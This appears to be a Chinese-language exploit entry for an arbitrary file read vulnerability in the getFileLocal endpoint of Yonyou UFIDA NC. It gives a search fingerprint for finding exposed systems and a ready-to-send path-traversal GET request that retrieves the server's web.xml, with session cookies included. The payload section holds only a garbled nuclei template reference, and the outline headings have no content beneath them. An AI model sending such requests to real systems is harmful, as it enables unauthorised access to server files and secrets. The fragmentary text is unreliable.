# 用友UFIDANCgetFileLocal存在任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="用友 UFIDA NC"`
- **请求**：`GET /portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=8EBDF4C237BC5C74D3DCFBC03A800E45.server1; sl-session=jDXMDyG3JGVNQdvt…`

**请求体 / payload**
```

nuclei脚本\
\[yongyou-ufida-nc-file-文件读取.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友UFIDA NC getFileLocal 存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友UFIDA NC